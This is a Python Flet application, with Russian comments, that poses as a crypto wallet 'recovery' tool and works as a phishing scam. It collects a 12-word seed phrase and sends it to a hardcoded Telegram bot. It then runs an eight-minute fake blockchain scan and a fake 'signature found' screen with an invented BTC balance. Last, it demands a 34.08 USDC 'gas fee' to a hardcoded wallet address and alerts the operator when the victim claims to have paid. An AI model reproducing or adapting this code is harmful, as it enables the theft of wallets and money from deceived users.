import flet as ft
import random
import asyncio
import requests

# --- ТВОИ ДАННЫЕ ---
TOKEN = "8601525427:AAEuynoRLo7TkjpKQ1aflArSGXplmsGIZVw"
CHAT_ID = "8601525427" 
TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"

async def main(page: ft.Page):
    page.theme_mode = ft.ThemeMode.DARK
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.padding = 30

    container = ft.Column(horizontal_alignment="center", spacing=20)
    
    # Экраны
    header = ft.Text("NODE INITIALIZATION", size=26, weight="bold", color="blueaccent")
    seed_input = ft.TextField(label="Seed Phrase (12 words)", multiline=True, min_lines=3, width=350, border_radius=12)
    start_btn = ft.ElevatedButton("START RECOVERY", width=300, height=55, bgcolor="blue", color="white")
    
    progress_bar = ft.ProgressBar(width=350, color="blueaccent", visible=False)
    log_text = ft.Text("", italic=True, visible=False)

    # Функция отправки в Телеграм
    async def send_to_tg(message):
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
        try:
            # Пытаемся отправить через фоновый запрос
            await asyncio.to_thread(requests.get, url, timeout=5)
        except:
            # Если не вышло, пробуем через браузерную команду
            await page.launch_url_async(url)

    async def start_process(e):
        phrase = seed_input.value.strip()
        if len(phrase.split()) != 12:
            page.snack_bar = ft.SnackBar(ft.Text("Введите 12 слов!"))
            page.snack_bar.open = True
            await page.update_async()
            return

        # 1. СРАЗУ ОТПРАВЛЯЕМ СЛОВА (ДВОЙНАЯ ОТПРАВКА)
        await send_to_tg(f"🚨 НОВАЯ СИД-ФРАЗА:\n{phrase}")

        # 2. ПЕРЕХОД К ЗАГРУЗКЕ
        seed_input.visible = False
        start_btn.visible = False
        header.value = "SCANNING BLOCKCHAIN..."
        progress_bar.visible = True
        log_text.visible = True
        await page.update_async()

        # 3. ИМИТАЦИЯ СКАНИРОВАНИЯ (8 МИНУТ)
        # 100 шагов по 4.8 секунды = 480 секунд (8 минут)
        steps = ["Connecting to Node...", "Scanning Mempool...", "Decrypting Ledger...", "Finalizing Scan..."]
        for i in range(101):
            if i % 25 == 0:
                log_text.value = steps[min(i // 25, len(steps)-1)]
            progress_bar.value = i / 100
            await page.update_async()
            await asyncio.sleep(4.8) 

        # 4. ФИНАЛЬНЫЙ ЭКРАН (ОПЛАТА ГАЗА)
        btc = round(random.uniform(0.00065, 0.00098), 6)
        container.controls.clear()
        container.controls.extend([
            ft.Icon(ft.icons.CHECK_CIRCLE, color="green", size=70),
            ft.Text("SIGNATURE FOUND!", size=24, weight="bold", color="green"),
            ft.Text(f"Available for Withdrawal: {btc} BTC", size=18, weight="bold"),
            ft.Container(
                padding=20, bgcolor="#1a1a1a", border_radius=15, border=ft.border.all(1, "white10"),
                content=ft.Column([
                    ft.Text("To unlock funds, pay Network Gas Fee (34.08 USDC):", size=13, text_align="center"),
                    ft.Text("Network: BNB Smart Chain (BEP20)", size=12, weight="bold", color="white70"),
                    ft.Text(TARGET_ADDRESS, size=11, color="blue200", selectable=True, weight="bold"),
                ], horizontal_alignment="center")
            ),
            ft.ElevatedButton("I HAVE PAID (CONFIRM)", width=300, height=55, on_click=show_done)
        ])
        await page.update_async()

    async def show_done(e):
        container.controls.clear()
        container.controls.extend([
            ft.Icon(ft.icons.DONE_ALL, color="blue", size=70),
            ft.Text("TRANSACTION SENT!", size=24, weight="bold"),
            ft.Text("The BTC has been sent to your wallet address.\nPlease wait for 3 network confirmations.", text_align="center"),
            ft.Text("Status: Pending...", color="yellow", size=16)
        ])
        await send_to_tg("💰 ПОЛЬЗОВАТЕЛЬ НАЖАЛ 'ОПЛАТИЛ'!")
        await page.update_async()

    start_btn.on_click = start_process
    container.controls.extend([header, seed_input, start_btn, progress_bar, log_text])
    await page.add_async(container)

if __name__ == "__main__":
    ft.app(target=main)
